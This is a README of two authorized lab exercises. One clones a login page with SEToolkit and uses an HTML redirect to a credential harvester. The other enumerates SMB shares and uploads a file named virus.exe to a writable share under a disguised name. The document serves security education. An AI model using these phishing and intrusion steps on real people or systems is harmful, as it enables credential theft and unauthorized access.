# Website-Cloning-using-Setoolkit-SMB-Vulnerabilities-using-Enum4Linux-Lab

This repository contains documentation for two ethical hacking labs performed in a controlled and authorized lab environment strictly for educational purposes.

## 📌 Labs Included

Website Cloning using SEToolkit

SMB Vulnerability Scanning using Enum4Linux

## Each lab includes:

. Step-by-step procedure

. Commands used

. Screenshots

. Observations and findings

## ⚠️ Disclaimer

All activities were conducted in a private lab environment with full authorization.
Never perform these techniques on real systems without permission.

## 📂 Lab 1: Website Cloning SET/Website Cloning Lab using SEToolkit

## 🎯 Objective

To understand how website cloning and credential harvesting work, and why users must be cautious of phishing and fake login pages.

## 🛠 Tools Used

Kali Linux

SEToolkit

## 🌐 Lab Setup

Component	Details:

Attacker Machine: Ethical Hacker (Kali Linux)

Target Website: DVWA (Lab VM)

Attacker IP	10.6.6.1

🔹 Step 1: Start SEToolkit

```bash
sudo su
setoolkit
```


This launches the Social-Engineer Toolkit.

## 🔹 Step 2: Select Attack Type

Inside SEToolkit:

1  → Social-Engineering Attacks  
2  → Website Attack Vectors  
3  → Credential Harvester Attack Method  
2  → Site Cloner

## 🔹 Step 3: Configure the Cloning Attack

Enter attacker IP:

```bash
10.6.6.1
```


Enter website to clone:

```bash
http://dvwa.vm
```

SEToolkit clones the site and hosts it on the attacker system.

## 🔹 Step 4: Create Redirect HTML File

```bash
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>
```


## Steps:

i. Open a text editor

ii. Paste the code

iii. Save as ladies.html on Desktop

iv. Double-click to open in browser

## 🔹 Step 5: Test Credential Capture

Test credentials (dummy):

```bash
Email: ladies@gmail.com

Password: 1234
```

You can also use different test credentials.

## 🔹 Step 6: Stop the Attack

Back in terminal and stop settoolkit: `Ctrl + C`

Exit the setoolkit by typing command:

```bash
99
99
99
99
```

## 🔹 Step 7: View Captured Report

```bash
cat /root/.set/reports/"2025-12-14 13:34:09.326665.xml"
```

## 📊 Findings

. The cloned website was identical to the original

. Test credentials were successfully harvested

. Demonstrates the effectiveness of phishing attacks

## ✅ Key Takeaways

. Website cloning is a common phishing technique

. Always verify URLs before entering credentials

. User security awareness is essential

## 📂 Lab 2: SMB-Enum4Linux/

## SMB Vulnerability Scanning using Enum4Linux

## 🎯 Objective

# To identify SMB misconfigurations by enumerating users, shares, and permissions.

# 🛠 Tools Used

Nmap

Enum4Linux

smbclient

## 🌐 Lab Setup

# Component	Details

Attacker Machine: Kali Linux

Target IP: 172.17.0.2

## 🔹 Step 1: Network Discovery

```bash
nmap -sN 172.17.0.0/24
```

## 🔹 Step 2: SMB Enumeration with Enum4Linux

Enumerate Users

```bash
enum4linux -U 172.17.0.2
```

Enumerate Machines

```bash
enum4linux -M 172.17.0.2
```

Enumerate SMB Shares

```bash
enum4linux -S 172.17.0.2
```

Verbose Share Enumeration

```bash
enum4linux -Sv 172.17.0.2
```

Password Policy

```bash
enum4linux -P 172.17.0.2
```

Full Enumeration

```bash
enum4linux -a 172.17.0.2
```

## 🔹 Step 3: Accessing SMB Shares

List Available Shares

```bash
smbclient -L //172.17.0.2/
```

Access Print Share

```bash
smbclient //172.17.0.2/print$
```

Access Temporary Share

```bash
smbclient //172.17.0.2/tmp
```

## 🔹 Step 4: File Upload Test (Educational Only)

Create test file:

```bash
nano virus.exe
```

Upload (masked name):

```bash
put virus.exe group_work.txt
```

## ⚠️ File was harmless and used only for demonstration.

## 📊 Findings

. SMB shares were accessible with weak restrictions

. Enum4Linux exposed system info, users & shares

. Writable SMB shares create major security risks

## ✅ Key Takeaways

. SMB services must be properly secured

. Enumeration is a critical attack phase

. Least-privilege reduces risk

## 🧾 Conclusion

These labs provided hands-on experience with real-world attack techniques—website cloning and SMB enumeration—performed ethically in a controlled environment.

They strengthened my understanding of:

. Social engineering and phishing risks

. How misconfigured SMB services expose sensitive data

. The importance of user awareness and secure system configuration

. Ethical responsibility when using penetration testing tools

All lessons learned will be applied toward defensive security and ethical penetration testing pratices.
